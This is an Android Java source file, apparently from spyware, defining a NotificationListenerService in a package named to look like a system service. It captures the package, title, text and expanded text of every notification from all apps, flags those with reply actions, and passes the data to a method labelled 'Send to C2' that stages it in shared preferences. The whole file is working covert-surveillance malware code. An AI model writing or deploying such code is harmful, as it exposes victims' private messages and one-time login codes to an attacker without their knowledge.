package com.system.service.collection;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;

public class NotificationCollector extends NotificationListenerService {

    private static final String TAG = "NotificationCollector";

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        processNotification(sbn, "POSTED");
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        processNotification(sbn, "REMOVED");
    }

    private void processNotification(StatusBarNotification sbn, String action) {
        String pkg = sbn.getPackageName();
        if (pkg == null) return;

        JsonObject data = new JsonObject();
        data.addProperty("package", pkg);
        data.addProperty("action", action);
        data.addProperty("timestamp", System.currentTimeMillis());
        data.addProperty("id", sbn.getId());
        data.addProperty("tag", sbn.getTag());

        android.app.Notification notification = sbn.getNotification();
        if (notification != null) {
            // Extract text from notification
            CharSequence title = notification.extras.getCharSequence(android.app.Notification.EXTRA_TITLE);
            CharSequence text = notification.extras.getCharSequence(android.app.Notification.EXTRA_TEXT);
            CharSequence bigText = notification.extras.getCharSequence(android.app.Notification.EXTRA_BIG_TEXT);
            
            JsonArray texts = new JsonArray();
            if (title != null) {
                JsonObject t = new JsonObject();
                t.addProperty("type", "title");
                t.addProperty("content", title.toString());
                texts.add(t);
            }
            if (text != null) {
                JsonObject t = new JsonObject();
                t.addProperty("type", "text");
                t.addProperty("content", text.toString());
                texts.add(t);
            }
            if (bigText != null) {
                JsonObject t = new JsonObject();
                t.addProperty("type", "big_text");
                t.addProperty("content", bigText.toString());
                texts.add(t);
            }
            data.add("content", texts);

            // Check for remote input (replies)
            android.app.RemoteInput[] remoteInputs = android.app.RemoteInput.getRemoteInputsFromActions(notification.actions);
            if (remoteInputs != null && remoteInputs.length > 0) {
                data.addProperty("has_reply_action", true);
            }
        }

        // Send to C2
        sendToC2(data);
    }

    private void sendToC2(JsonObject data) {
        CoreApplication app = CoreApplication.getInstance();
        if (app != null) {
            app.getPrefs().edit().putString("notification_data", data.toString()).apply();
        }
    }
}